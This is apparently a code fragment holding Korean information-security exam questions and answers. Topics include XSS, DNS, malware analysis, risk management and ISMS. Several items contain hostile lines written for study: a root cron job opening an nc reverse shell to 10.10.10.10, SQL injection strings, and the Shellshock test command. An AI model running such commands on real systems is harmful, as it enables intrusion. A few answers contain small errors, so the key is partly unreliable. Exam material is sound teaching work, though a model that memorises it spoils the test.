xml+='  <problem id="195">다음은 사용자가 악성코드에 감염된 경로를 추적한 결과이다. 다음 물음에 답하시오.&lt;br&gt;&lt;br&gt;[경로 추적 결과]&lt;br&gt;① http://aaa.com 접속 후 게시물 열람&lt;br&gt;② 200.11.22.33 일시적으로 접속 후 여러 사이트 리다이렉트, 최종적으로 200.11.22.99 접속&lt;br&gt;③ 악성 실행파일 다운로드후 자동 실행&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;1) 위와 같은 공격 기법을 무엇이라 하는가?&lt;br&gt;&lt;br&gt;2) 위와 같은 공격 기법을 볼 때 사용자(클라이언트)가 실제 &lt;br&gt;악성코드에 감염되는 곳은 어디인가?&lt;br&gt;&lt;br&gt;3) 악성 코드에 대응하기 위한 정적 분석과 동적 분석 방안을 설명하시오.</problem>';
xml+='  <answer id="195">(1) Drive By Download 공격&lt;br&gt;&lt;br&gt;(2) 200.11.22.99&lt;br&gt;&lt;br&gt;(3) 정적분석 : 홈페이지 소스코드를 분석해 알려진 악성코드 경유지/중계지/유포지 또는 악성 스크립트 문자열을 포함하는 악성링크가 있는지 탐지하는 방식&lt;br&gt;&lt;br&gt;동적분석 : 가상PC환경을 구성해 여러가지 취약점에 노출시킨뒤 직접 홈페이지에 접속해 악성행위를 분석함</answer>';
xml+='  <problem id="196">특정 웹 페이지에 실행 가능한 스크립트를 삽입하여 &lt;br&gt;페이지 방문자의 개인정보나 쿠키정보를 탈취하여 전송하는 공격 유형을 설명하고 해당 공격을 보완하기 위한 방안을 서술하시오.</problem>';
xml+='  <answer id="196">1) 공격유형 : 크로스사이트스크립트(XSS)&lt;br&gt;&lt;br&gt;2) 보완 방안 :&lt;br&gt;&lt;br&gt;입력값 검증을 통해 악위적인 행위를 하는 스크립트가 사용되지 않도록 검증을 한다.&lt;br&gt;&lt;br&gt;‘&lt;’, ‘&gt;’ 등 태그 문자의 직접 입력을 차단하고 &lt; &gt; 등 특수문자로 치환한다.&lt;br&gt;&lt;br&gt;이벤트 발생을 통해 Javascript를 실행 할 수 있는 onload, onmouseover 등의 태그 속성값을 사용자가 변경하지 못 하도록 차단한다.</answer>';
xml+='  <problem id="197">악성코드의 동작을 분석하기 위해 SysAnalyzer를 이용하여 &lt;br&gt;악성코드 동작 전후 스냅샷 결과 다음과 같은 시스템 변경사항이 &lt;br&gt;발견되었다. 각 동작을 설명하시오.&lt;br&gt;&lt;br&gt;1. CreateFileA(C:\\windows\\system32\\msnsrv.exe)&lt;br&gt;&lt;br&gt;   CreateFileA(C:\\windows\\system32\\wassa.exe)&lt;br&gt;&lt;br&gt;2. KEY : HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List&lt;br&gt;&lt;br&gt;   Value : "9070:TCP"="9070:TCP:*:Enabled:Agent"&lt;br&gt;&lt;br&gt;3. KEY : HKLM\\Softeware\\Microoft\\Windows\\CureentVersion\\Run&lt;br&gt;&lt;br&gt;   Value : "wassa.exe"="c:\\\\windows\\\\system32\\\\wassa.exe"&lt;br&gt;&lt;br&gt;4. KEY : HKLM\\SYSTEM\\CurrentCnotrolSet\\Services\\msnsrv.exe&lt;br&gt;&lt;br&gt;   Value : "Start"=dword:00000002&lt;br&gt;&lt;br&gt;5. KEY : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVerion\\Explorer\\Advanced\\Foler\\Hidden\\SHOWALL&lt;br&gt;&lt;br&gt;   Value : "CheckedValue"=dword:00000000</problem>';
xml+='  <answer id="197">1. msnsrv.exe 와 wassa.exe 파일 생성&lt;br&gt;&lt;br&gt;2. 윈도우 방화벽에 9070/tcp 포트 오픈 허용&lt;br&gt;&lt;br&gt;3. wassa.exe를 윈도우 시작시 자동으로 시작하는 시작 프로그램에 등록.&lt;br&gt;&lt;br&gt;4. msnsrv.exe를 윈도우 서비스에 자동실행 등록해 윈도우 기동시 자동 실행.&lt;br&gt;&lt;br&gt;5. 윈도우 탐색기의 폴더옵션&gt;숨김 파일 및 폴더 옵션을 표시함(1)으로 변경할 수 없게 함.</answer>';
xml+='  <problem id="198">DNS 서비스 운영 시 Zone Transfer 설정이 적절히 되어 있지 않은 경우 Zone 정보가 유출되는 취약점이 발생할 수 있다. 다음 빈 칸에 들어갈 dig 명령의 옵션을 명시하고 아래와 같은 결과를 방지하기 위한 대응 방안을 서술하시오.&lt;br&gt;&lt;br&gt;&lt;br&gt;# dig (   ) @192.168.19.131 q.fran.kr&lt;br&gt;&lt;br&gt;;  DIG 9.3.1  (    ) @192.168.19.131 q.fran.kr&lt;br&gt;&lt;br&gt;; (1 server found)&lt;br&gt;&lt;br&gt;;; global options: printcmd&lt;br&gt;&lt;br&gt;q.fran.kr.                    1800       IN      SOA     ns1.fran.kr.master.fran.kr. 2015012501 21600 1800 604800 1800</problem>';
xml+='  <answer id="198">1) axfr&lt;br&gt;&lt;br&gt;2) 대응방안&lt;br&gt;&lt;br&gt;zone transfer는 master와 slave DNS 서버 간에 zone 데이터를 동기화하는 작업임.&lt;br&gt;&lt;br&gt;- Master 단독으로 운영할 시, zone transfer를 허용하지 않도록 설정.&lt;br&gt;&lt;br&gt;- Slave와 같이 운영할시, 해당 slave만 허용하도록 설정한다.</answer>';
xml+='  <problem id="199">TCP 스캔을 수행 중이다. 각 경우에 알맞은 Flag 를 기술하시오.&lt;br&gt;&lt;br&gt;1) TCP Open Scan 시 포트가 닫힌 경우 공격자가 ( A ) flag를 송신하면 수신 호스트는 ( B ) flag를 응답 한다.&lt;br&gt;&lt;br&gt;2) TCP Half-Open Scan 시 포트가 열린 경우 공격자가 ( C ) flag를 송신하면 수신 호스트는 ( D ) 를 응답하고, 공격자는 다시 ( E ) flag를 송신하여 연결을 끊는다.</problem>';
xml+='  <answer id="199">A: SYN, B: ACK+RST, C: SYN, D: SYN+ACK, E: RST</answer>';
xml+='  <problem id="200">SNMPv3 에선 msgSecurityParameters 보안설정을 통해&lt;br&gt;여러 취약점을 해소할 수 있다.&lt;br&gt;다음 각 옵션에 대한 보안기능을 기술하시오.&lt;br&gt;&lt;br&gt;msgAuthoritativeEngineID (A)&lt;br&gt;msgAuthoritativeEngineBoots (A)&lt;br&gt;msgAuthoritativeEngineTime (A)&lt;br&gt;msgUserName (B)&lt;br&gt;msgAuthenticationParameters (B)&lt;br&gt;msgPrivacyParameters (C)&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="200">A: 재전송 방지&lt;br&gt;B: 위장 공격 방지&lt;br&gt;C: 메시지 기밀성 부여</answer>';
xml+='  <problem id="201">다음은 아래 DNS 관련 로그에 나타난 이 공격을 막기 위한 라우터 ACL 설정 명령어이다. (A), (B)를 기술하시오.&lt;br&gt;&lt;br&gt;10-Feb-2016 13:21:41.757 queries: info: client 10.10.100.27#12451: view external: query: test.com IN ANY + (10.10.100.1)&lt;br&gt;&lt;br&gt;10-Feb-2016 13:21:41.897 queries: info: client 10.10.100.27#32282: view external: query: test.com IN ANY + (10.10.100.1)&lt;br&gt;&lt;br&gt;10-Feb-2016 13:21:42.054 queries: info: client 10.10.100.27#18676: view external: query: test.com IN ANY + (10.10.100.1)&lt;br&gt;&lt;br&gt;10-Feb-2016 13:21:42.059 queries: info: client 10.10.100.27#20630: view external: query: test.com IN ANY + (10.10.100.1)&lt;br&gt;&lt;br&gt;10-Feb-2016 13:21:42.193 queries: info: client 10.10.100.27#14893: view external: query: test.com IN ANY + (10.10.100.1)&lt;br&gt;&lt;br&gt;10-Feb-2016 13:21:42.204 queries: info: client 10.10.100.27#14893: view external: query: test.com IN ANY + (10.10.100.1)&lt;br&gt;&lt;br&gt;access-list 1 deny ( A ) any any eq ( B )&lt;br&gt;</problem>';
xml+='  <answer id="201">(A): udp, (B): 53</answer>';
xml+='  <problem id="202">다음은 netstat -rn 명령을 수행한 결과이다. A, B, C 목적지로 ping 명령 수행 시 사용되는 gateway 주소를 쓰시오.&lt;br&gt;&lt;br&gt;# netstat -nr&lt;br&gt;&lt;br&gt;Destination        Gateway               Genmask             Flags          Iface&lt;br&gt;&lt;br&gt;10.0.96.100      10.0.160.1        255.255.255.255       UGH          eth0&lt;br&gt;&lt;br&gt;10.0.64.0          10.0.160.2        255.255.255.0           UG           eth0&lt;br&gt;&lt;br&gt;10.0.64.0          10.0.160.3        255.255.192.0           UG           eth0&lt;br&gt;&lt;br&gt;10.0.128.0        10.0.160.4        255.255.192.0           UG           eth0&lt;br&gt;&lt;br&gt;10.0.160.0               *              255.255.254.0            U            eth0&lt;br&gt;&lt;br&gt;127.0.0.0                 *              255.0.0.0                   U            lo&lt;br&gt;&lt;br&gt;0.0.0.0             10.0.160.5        0.0.0.0                      UG          eth0&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;(A) 10.0.96.100&lt;br&gt;(B) 10.0.122.100&lt;br&gt;(C) 10.0.192.100</problem>';
xml+='  <answer id="202">(A) 10.0.160.1&lt;br&gt;(B) 10.0.160.3&lt;br&gt;(C) 10.0.160.5</answer>';
xml+='  <problem id="203">Linux/UNIX시스템에서 보기의 명령어를 수행할 경우 참조되는 로그파일을 쓰시오.&lt;br&gt;&lt;br&gt;1) who&lt;br&gt;2) last&lt;br&gt;3) lastcomm</problem>';
xml+='  <answer id="203">1) utmp&lt;br&gt;2) wtmp&lt;br&gt;3) acct 또는 pacct</answer>';
xml+='  <problem id="204">유닉스 기반의 운영체제들은 root 계정으로 원격에서 접속하는 것을 제한할 수 있다. 다음 운영체제에서 root 원격 접속을 제한하기 위해 사용되는 설정 파일을 쓰시오.&lt;br&gt;&lt;br&gt;1) Solaris&lt;br&gt;&lt;br&gt;2) Unix&lt;br&gt;&lt;br&gt;3) Linux</problem>';
xml+='  <answer id="204">1) /etc/default/login,&lt;br&gt;2) /etc/security/user,&lt;br&gt;3) /etc/securetty</answer>';
xml+='  <problem id="205">위험 관리와 관련하여 보기에서 설명하는 용어를 쓰시오.&lt;br&gt;&lt;br&gt;1) 조직이 보호해야 할 대상으로 정보, 하드웨어, 소프트웨어, &lt;br&gt;시설 등을 말하며 관련 인력, 기업 이미지 등 무형의 것도 포함&lt;br&gt;&lt;br&gt;2) 보호 대상에 대한 잠재적 속성이나 처한 환경으로, 관리적·기술적·물리적 약점&lt;br&gt;&lt;br&gt;3) 보호 대상에 손실을 초래할 수 있는 원치 않는 사건의 잠재적 원인이나 행위자</problem>';
xml+='  <answer id="205">1) 자산(Asset)&lt;br&gt;2) 취약점(Vulnerability)&lt;br&gt;3) 위협(Threat)</answer>';
xml+='  <problem id="206">정보보호관리체계(ISMS)의 라이프사이클 단계 4가지 ( A ), ( B ), ( C )에 알맞은 용어를 작성하시오&lt;br&gt;&lt;br&gt;( A ) 단계&lt;br&gt;조직의 종합적인 정책과 목표에 따른 결과를 산출하기 위하여 위험관리를 수행하고 정보보호를 개선하기 위한 정책, 목표, 세부 목표, 프로세스 및 절차를 수립한다.&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;( B ) 단계&lt;br&gt;보안 정책, 통제, 프로세스 및 절차를 구현하고 운영한다.&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;( C ) 단계&lt;br&gt;보안 정책, 목표 및 실제경험에 대한 프로세스 성과를 평가하고, 가능하다면 성과를 측정한다. 그 결과를 경영자에게 보고하여 검토한다.&lt;br&gt;&lt;br&gt;조치(Act) 단계&lt;br&gt;관리체계의 지속적 개선을 달성하기 위해 검토 결과에 근거하여 시정 및 예방조치를 실시한다.</problem>';
xml+='  <answer id="206">A: 계획단계(Plan)&lt;br&gt;B: 실행단계(Do)&lt;br&gt;C: 검토단계(Check)</answer>';
xml+='  <problem id="207">개인정보처리자가 개인정보를 안전하게 관리하기 위하여 내부 의사결정 절차를 통하여 수립시행하는 내부기준을 말한다. 이 내부 계획에는 아래의 내용이 포함되어야 한다.&lt;br&gt;&lt;br&gt;&lt;br&gt;1. 개인정보관리책임자의 자격요건 및 지정에 관한 사항&lt;br&gt;2. 개인정보관리책임자와 개인정보취급자의 역할 및 책임에 관한 사항&lt;br&gt;3. 개인정보의 기술적·관리적 보호조치 이행 여부의 내부 점검에 관한 사항&lt;br&gt;4. 개인정보 처리업무를 위탁하는 경우 수탁자에 대한 관리 및 감독에 관한 사항&lt;br&gt;5. 개인정보의 분실·도난·누출·변조·훼손 등이 발생한 경우의 대응절차 및 방법에 관한 사항</problem>';
xml+='  <answer id="207">내부 관리계획</answer>';
xml+='  <problem id="208">위험 분석 방법 중 정성적 방법과 정량적 방법을 각각 2가지씩 쓰시오.</problem>';
xml+='  <answer id="208">1) 정성적 위험분석 방법: 델파이법, 시나리오법, 순위결정법 중 2개&lt;br&gt;&lt;br&gt;2) 정량적 위험분석 방법: 몬테카를로 시뮬레이션, 의사결정 나무 분석, 과거자료 분석, 수학공식 접근, 확률분포법 중 2개</answer>';
xml+='  <problem id="209">위험분석 방법 중 복합적 접근 방법의 장점과 단점을 설명하시오.</problem>';
xml+='  <answer id="209">1) 장점 : 비용과 자원을 효율적으로 사용할 수 있음. 고위험 영역을 빠르게 식별이 가능&lt;br&gt;&lt;br&gt;2) 단점 : 고위험 영역이 잘못 식별되었을 경우, 위험분석 비용이 낭비되거나 부적절하게 대응될 수 있음</answer>';
xml+='  <problem id="210">DNS 증폭 공격(DNS Amplification DDoS Attack) 중 IP기반 공격에 대해 설명하고 IP기반 공격을 사용하는 이유와 사용하는 레코드 type을 기술하시오.&lt;br&gt;&lt;br&gt;1) 주로 사용되는 IP 기반 공격&lt;br&gt;&lt;br&gt;2) 해당 공격기법을 이용하는 이유&lt;br&gt;&lt;br&gt;3) 주로 사용하는 DNS 쿼리 타입&lt;br&gt;&lt;br&gt;4) 해당 타입을 사용하는 이유</problem>';
xml+='  <answer id="210">1) IP 기반 DNS 증폭 공격기법 : IP Spoofing 을 사용하여 출발지(Source) IP를 공격하고자 하는 희생자(victim)서버의 IP로 위조한 후 다수의 DNS 질의를 수행한다&lt;br&gt;&lt;br&gt;2) 공격기법 이유 : 공격자의 DNS 질의에 대한 응답 패킷을 IP Spoofing 된 희생자 서버가 수신하게되므로 서비스거부 공격 가능&lt;br&gt;&lt;br&gt;3) DNS쿼리 타입 : ANY 혹은 TXT 레코드 타입&lt;br&gt;&lt;br&gt;4) 해당 레코드 타입 사용 이유 : any 또는 txt type의 경우 요청하는 패킷의 크기와 응답 패킷 크기가 비대칭적으로 응답 패킷 사이즈가 크기 때문에 적은 컴퓨팅 리소스로 효율적인 공격이 가능</answer>';
xml+='  <problem id="211">웹 서버에서 다음과 같은 SQL SELECT 문이 수행된다고 할 때 아래의 항목에 대해서 설명하시오.&lt;br&gt;&lt;br&gt;SELECT password FROM user WHERE username=\'qfrankr\'&lt;br&gt;&lt;br&gt;&lt;br&gt;1) 쿼리의 결과는 무엇인가?&lt;br&gt;&lt;br&gt;2) 모든 사용자의 정보를 획득하기 위해 \'qfrankr\' 부분에 들어갈 예시를 작성하시오.&lt;br&gt;&lt;br&gt;3) 위 예시가 가능한 이유는 무엇인가?</problem>';
xml+='  <answer id="211">1) qfrankr 사용자에 대한 패스워드 정보를 확인한다.&lt;br&gt;&lt;br&gt;2) \' or \'a\'=\'a 또는 \' or \'1\'=\'1 등 조건절을 참으로 만드는 다양한 조건값이 가능.&lt;br&gt;&lt;br&gt;3) 조건절이 WHERE username=\'\' or \'1\'=\'1\'이 되므로 항상 결과가 참이 된다.</answer>';
xml+='  <problem id="212">게이트웨이의 IP주소가 172.111.11.1이고 MAC주소가 11-22-33-44-55-66인 환경에서 다음 커맨드에 출력된 내용을 참고하여 어떤 유형의 공격인지 판단하고 판단 근거 및 대응방안을 서술하시오.&lt;br&gt;&lt;br&gt;Internet Address   Physical Address          Type&lt;br&gt;&lt;br&gt;172.111.11.1       11-22-33-44-55-66     Dynamic&lt;br&gt;&lt;br&gt;172.111.11.2       aa-bb-cc-dd-ee-ff        Dynamic&lt;br&gt;&lt;br&gt;172.111.11.3       11-22-33-44-55-66     Dynamic&lt;br&gt;&lt;br&gt;172.111.22.2       xx-yy-zz-11-22-33       Dynamic</problem>';
xml+='  <answer id="212">공격유형 : ARP Spoofing&lt;br&gt;&lt;br&gt;판단근거 : 172.111.11.3이 172.111.11.1과 같은 MAC 주소를 가지고 있다.&lt;br&gt;&lt;br&gt;대응방안 : ARP cache Table 정보를 정적(static)으로 설정하여 ARP 프로토콜을 통한 변조가 발생하지 않도록 함.&lt;br&gt;&lt;br&gt;ARP ?s [게이트웨이IP] [게이트웨이MAC주소]</answer>';
xml+='  <problem id="213">윈도우 PE(Portable Executable) IMAGE_SECTION_HEADER에는 각 세션들의 시작주소와 크기가 있다. 괄호안에 알맞은 용어를 넣으시오.&lt;br&gt;&lt;br&gt;1) 실행 코드의 정보가 저장되는 영역&lt;br&gt;&lt;br&gt;2) 전역변수, 상수의 정보가 저장되는 영역&lt;br&gt;&lt;br&gt;3) DLL에서 가져온 함수 정보가 저장되는 영역</problem>';
xml+='  <answer id="213">1) text&lt;br&gt;&lt;br&gt;2) data&lt;br&gt;&lt;br&gt;3) IAT(Important Address Table)</answer>';
xml+='  <problem id="214">익스플로잇과 관련된 다음 보기에 알맞은 용어를 넣으시오.&lt;br&gt;&lt;br&gt;1) 실제로 기계어로 구성되어 Exploit의 본체에 해당하는 프로그램의 명칭은 무엇인가?&lt;br&gt;&lt;br&gt;2) x86계열에서 NOP(No Operation) code를 hex로 표현함ㄴ 어느값인가?&lt;br&gt;&lt;br&gt;3) x86계열에서 ESP에 들어있는 값을 EIP로 이동하는 어셈블리 코드를 적으시오.</problem>';
xml+='  <answer id="214">1) 셸코드&lt;br&gt;&lt;br&gt;2) 0x90&lt;br&gt;&lt;br&gt;3) jump esp</answer>';
xml+='  <problem id="215">Snort 정책에서 10바이트에서 12바이트 중 00FF 바이트에 해당하는 내용을 찾으려고 한다. 보기의 rule에 빈칸을 채워 rule을 완성하시오.&lt;br&gt;&lt;br&gt;alert tcp any any (( A ):"|00FF|";( B ):9,( C ):2)</problem>';
xml+='  <answer id="215">A: content&lt;br&gt;B: offset&lt;br&gt;C: depth</answer>';
xml+='  <problem id="216">윈도우 DNS 서버에서 DNS 설정 시 두 가지 절차를 거친다. &lt;br&gt;보기에서 설명하는 절차를 적으시오.&lt;br&gt;&lt;br&gt;1) 도메인 DNS서버를 등록하는 절차&lt;br&gt;&lt;br&gt;2) DNS 서버에 서비스정보를 입력하는 절차&lt;br&gt;</problem>';
xml+='  <answer id="216">1) zone 영역등록&lt;br&gt;&lt;br&gt;2) 호스트 등록</answer>';
xml+='  <problem id="217">네트워크 패킷을 분석할 수 있는 Wireshark에선 캡처된 파일에서 원하는 내용을 필터링하기 위한 디스플레이 필터(Display Filter)가 있다. 질의에 대한 응답 패킷만을 보기 위한 필터링 구문은?</problem>';
xml+='  <answer id="217">dns.flags.response==1</answer>';
xml+='  <problem id="218">다음에 해당하는 악성코드 분류에 대해 답하시오.&lt;br&gt;&lt;br&gt;키로거는 사용자가 키보드로 PC에 입력하는 내용을 몰래 낚아채어 기록하는 행위를 말한다. 하드웨어, 소프트웨어를 활용한 방법에서부터 전자적, 음향기술을 활용한 기법까지 다양한 키로깅 방법이 존재한다. 다음은 사용자 몰래 키로거를 설치할 수 있는 방법들이다. 어떤 방법들인가?&lt;br&gt;&lt;br&gt;1) 사용자가 접속한 웹페이지에서 팝업, iframe, 리다이렉트 등을 통해 사용자가 인식하지 못하게 악성코드를 다운로드 시키는 침해유형을 말한다.&lt;br&gt;&lt;br&gt;2) 정상 애플리케이션인 것처럼 배포된 뒤 자신의 내부에 압축해서 가지고 있던 코드를 이용하여 새로운 악성코드를 생성하여 시스템을 감염시킨다.</problem>';
xml+='  <answer id="218">1) 드라이브바이다운로드&lt;br&gt;&lt;br&gt;2) 드롭퍼</answer>';
xml+='  <problem id="219">다음은 파일 업로드 공격에 대한 설명이다. 괄호안에 들어갈 말을 적으시오.&lt;br&gt;&lt;br&gt;파일 업로드 취약점이 존재하는 경우 공격자가 웹서버에 명령을 수행할 수 있도록 작성한 (   괄호   )를 업로드하여 웹서버에 명령을 실행해 관리자 권한을 획득후 웹페이지 소스코드 열람, 서버 내 파일유형, 백도어 프로그램 설치등을 할수 있다.</problem>';
xml+='  <answer id="219">웹셸</answer>';
xml+='  <problem id="220">다음 괄호 안에 알맞은 용어를 넣으시오.&lt;br&gt;&lt;br&gt;APT는 지능형 지속공격으로 특정 회사의 중요 정보 획득, 정치적 목적,사이버 테러 등을 목적으로 하는 해커에 의해 사이트, 기업, 개인을 상대로 지속적으로 해킹하는 공격을 의미한다. 이에 대한 대비책인 (  괄호  ) 는 록히드마틴사가 정식 명칭을 특허로 등록하였다. 군사용으로 적 미사일 기지에 대한 선제공격을 의미하며, 사이버 공격에 대한 선제 대응책으로 사회적인 이슈로 대두되기도 하였다.&lt;br&gt;&lt;br&gt;APT 공격의 경우 7단계의 (정찰-&gt;무기제작 배달-&gt;취약점 공격-&gt;설치-&gt;명령 및 제어 -&gt; 표적대상행동) 공격을 진행한다. &lt;br&gt;특정 기관을 노릴경우 대상이 무엇이든지 간에 조금씩 침투하여 &lt;br&gt;공격을 감행하는 것이 특징이며, 이중 가장 취약한 절차에 대해서만 선제대응할 수 있다면 APT공격을 예방할수 있다는 것을 의미한다.</problem>';
xml+='  <answer id="220">사이버 킬 체인</answer>';
xml+='  <problem id="221">다음은 위협 통제 시점에 따른 분류이다. 알맞은 용어를 넣으시오&lt;br&gt;&lt;br&gt;1) 발생가능한 잠재적인 문제들을 식별하여 사전에 대응하기 위한 통제&lt;br&gt;&lt;br&gt;2) 1번 통제를 우회하여 발생하는 위협을 찾아내기 위한 통제&lt;br&gt;&lt;br&gt;3) 2번 통제에 따라 발견한 위협에 대처하거나 줄이는 통제</problem>';
xml+='  <answer id="221">1) 예방통제&lt;br&gt;&lt;br&gt;2) 탐지통제&lt;br&gt;&lt;br&gt;3) 교정통제</answer>';
xml+='  <problem id="222">정량적 위험 분석과 관련하여 아래 질문에 답하시오.&lt;br&gt;&lt;br&gt;1) SLE이란 무엇인가?&lt;br&gt;&lt;br&gt;2) SLE를 구하는 식을 적으시오.&lt;br&gt;&lt;br&gt;3) ALE를 구할때 SLE를 제외하고 필요한 것은 무엇인가?&lt;br&gt;&lt;br&gt;4) 연수익이 5천만원인 사이트 위험을 완전히 제거하는 비용이 연간 1억원이라고 할 때 이 사이트의 ROI는?</problem>';
xml+='  <answer id="222">1) SLE(Single Loss Expetancy, 단일손실예상) :특정한 위협이 발생하여 예상되는 1회 손실액&lt;br&gt;&lt;br&gt;2) SLE = AV(Asset Value, 자산가치) × EF(Exposure Factor, 노출 계수)&lt;br&gt;&lt;br&gt;3) ARO(Annual Rate of Occurrence, 연간발생률): 어떤 위협이 1년에 발생할 가능성(0~1)&lt;br&gt;&lt;br&gt;4) ROI = ( 수익 / 투자금 ) * 100&lt;br&gt;&lt;br&gt;ROI = ( 5천만 / 1억원 ) * 100 = 50%</answer>';
xml+='  <problem id="223">정보통신망 이용촉진 및 정보보호 등에 관한 법률에 따라 개인 정보 유출 사실을 안 때에는 지체없이 이용자에게 알려야 한다. &lt;br&gt;이때 알려야 할 사항 5가지를 기술하시오.</problem>';
xml+='  <answer id="223">1.유출된 개인정보 항목&lt;br&gt;2.유츨이 발생한 시점&lt;br&gt;3. 이용자가 취할 수 있는 조치&lt;br&gt;4. 정보통신서비스 제공자 등의 대응조치&lt;br&gt;5. 이용자가 상담 등을 접수할 수 있는 부서 및 연락처</answer>';
xml+='  <problem id="224">웹서버를 점검하던 중 cron에 새로운 작업이 등록된 것을 확인하였다. 다음 cron 작업들이 root권한으로 실행될 경우 발생할 수 있는 위험에 대해 설명하시오.&lt;br&gt;&lt;br&gt;0 0 6 * *   root   /bin/cp   /tmp/passwd1   /etc/passwd&lt;br&gt;&lt;br&gt;0 0 12 * *   root   /usr/bin/nc   10.10.10.10 80 -e /bin/bash</problem>';
xml+='  <answer id="224">1) 임의로 조작된 passwd 파일이 원래 passwd 파일을 덮어쓴다.&lt;br&gt;&lt;br&gt;2) 10.10.10.10 호스트에 80포트로 연결한다. 리버스쉘의 위험이 있다.</answer>';
xml+='  <problem id="225">보기의 명령은 CVE-2014-6271 취약점을 테스트해 볼 수 있는 예제이다. 이 취약점은 인터넷을 통해 간단한 명령만으로 시스템을 장악할 수 있는 심각한 취약점으로 NIST는 하트블리드보다 높은 위험 점수인 10점을 부여하였다. 아래 질문에 답하시오.&lt;br&gt;&lt;br&gt;$ env x=\'() { :;}; echo vulnerable\' bash -c "echo this is a test"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;1) 이 취약점의 이름은?&lt;br&gt;&lt;br&gt;2) 보기의 명령을 실행했을 때 취약점이 존재하는 경우와 존재하지 않는 경우의 결과를 설명하시오.&lt;br&gt;&lt;br&gt;3) 결과가 나오는 이유에 대해 설명하시오.</problem>';
xml+='  <answer id="225">1) 셸쇼크&lt;br&gt;&lt;br&gt;2) 취약점이 있는 경우 vulnerable this is a test 라고 출력되고, 취약점이 없는 경우 this is a test라고만 출력된다.&lt;br&gt;&lt;br&gt;3) Bash쉘이 제공하는 함수 선언기능을 이용한 취약점이다. "() {"로 시작하는 함수 선언문 끝에 명령어를 삽입해 환경변수에 저장할 경우 삽입한 명령어까지 실행된다.</answer>';
xml+='  <problem id="226">MySQL은 가장 대중적으로 사용되는 공개 소프트웨어 DBMS이다. MySQL 설정파일인 my.cnf에 이 옵션을 추가할 경우 외부 네트워크 사용자의 접근을 제한하고 로컬에서만 접근할 수 있게 된다. &lt;br&gt;이 옵션은 무엇인가?</problem>';
xml+='  <answer id="226">skip-networking</answer>';
xml+='  <problem id="227">정보보호 및 개인정보 관리체계 인증의 보호대책 요구사항이다. 빈 칸을 채워 넣으시오.&lt;br&gt;&lt;br&gt;1) 정책, 조직, 자산 관리&lt;br&gt;&lt;br&gt;2) &lt;br&gt;&lt;br&gt;3) 외부자 보안&lt;br&gt;&lt;br&gt;4) 물리보안&lt;br&gt;&lt;br&gt;5) 인증 및 권한 관리&lt;br&gt;&lt;br&gt;6) 접근통제&lt;br&gt;&lt;br&gt;7) &lt;br&gt;&lt;br&gt;8) 정보시스템 도입 및 개발 보안&lt;br&gt;&lt;br&gt;9) 시스템 및 서비스 운영관리&lt;br&gt;&lt;br&gt;10) 시스템 및 서비스 보안관리&lt;br&gt;&lt;br&gt;11) 사고 예방 및 대응&lt;br&gt;&lt;br&gt;12)</problem>';
xml+='  <answer id="227">인적보안, 암호화 적용, 재해복구</answer>';
xml+='  <problem id="228">리눅스 운영체제에서 현재 실행되고 있는 프로세스 정보를 기록하고 있는 디렉터리는 무엇인가?</problem>';
xml+='  <answer id="228">/proc</answer>';
xml+='  <problem id="229">다음 보기는 무선보안프로토콜 WEP에 대한 설명이다. 빈칸에 알맞은 용어를 넣으시오.&lt;br&gt;&lt;br&gt;WEP 암호화 방식은 IEEE 802.11b 프로토콜에서 적용되기 시작하여 ( A ) 암호화 알고리즘을 사용한다.40비트 길이의 WEP 비밀키와 임의로 할당되는 24비트 ( B ) 로 조합된 총 64비트의 키를 이용하여 ( A ) 알고리즘 암호화하는 방식이다.</problem>';
xml+='  <answer id="229">(A) : RC4&lt;br&gt;&lt;br&gt;(B) : IV(initialization Vector)</answer>';
xml+='  <problem id="230">다음은 정보보호 5가지 목표를 제시하고 있다. 빈칸에 알맞은 용어를 넣으시오.&lt;br&gt;&lt;br&gt;1) 기밀성 : 오직 인가된 사람, 프로세스, 시스템만이 알 필요성에 근거하여 시스템에 접근해야 한다는 성질&lt;br&gt;&lt;br&gt;2) 무결성 : 정보의 내용이 불법적으로 생성 또는 변경되거나 삭제되지 않도록 보호되어야 하는 성질&lt;br&gt;&lt;br&gt;3) ( A ) : 정당한 사용자가 정보시스템의 데이터 또는 자원을 필요할 때 지체 없이 접근하여 사용할 수 있는 성질&lt;br&gt;&lt;br&gt;4) ( B ) : 정보에 접근할 수 있는 객체의 자격이나 객체의 내용을 검증하는데 사용되는 성질&lt;br&gt;&lt;br&gt;5) ( C ) : 행위나 이벤트의 발생을 증명하여 나중에 그런 행위나 이벤트를 부인할 수 없도록 하는 것</problem>';
xml+='  <answer id="230">A: 가용성&lt;br&gt;&lt;br&gt;B: 인증&lt;br&gt;&lt;br&gt;C: 부인방지</answer>';
xml+='  <problem id="231">다음은 DNS에 관한 설명이다. 빈칸에 들어갈 용어를 적으시오.&lt;br&gt;&lt;br&gt;DNS 서버는 상위 DNS 서버에 질의하는 부하를 줄이기 위해 (  A  )를 이용한다. 적절한 주기의 갱신이 이루어지도록 하기 위해 이러한 (  A  )엔 유효기간이 있는데 이를 (  B  )라 한다.</problem>';
xml+='  <answer id="231">A: 캐시&lt;br&gt;&lt;br&gt;B: TTL</answer>';
xml+='  <problem id="232">리눅스에선 Read, Write, Execute 3가지 기본 권한 외에도 3가지 특수 권한이 존재한다. 다음은 3가지 특수권한에 대한 설명이다. 빈칸에 들어갈 적절한 용어를 기술하시오.&lt;br&gt;&lt;br&gt;(    A    ) 권한이 부여된 파일을 실행하면 실행하는 동안 해당 파일의 소유자 권한으로 인식하다. (   B  ) 권한은 실행하는 동안 해당 파일의 소유자 그룹 권한으로 인식한다. (   C   ) 권한은 디렉터리에만 적용되는 권한으로, 이 권한이 적용된 디렉터리엔 일반 사용자들이 자유롭게 파일을 쓸수 있지만 자신이 생성한 파일이 아니면 수정 삭제가 불가능하다.</problem>';
xml+='  <answer id="232">A: Set-UID, B: Set-GID, C: Sticky-Bit</answer>';
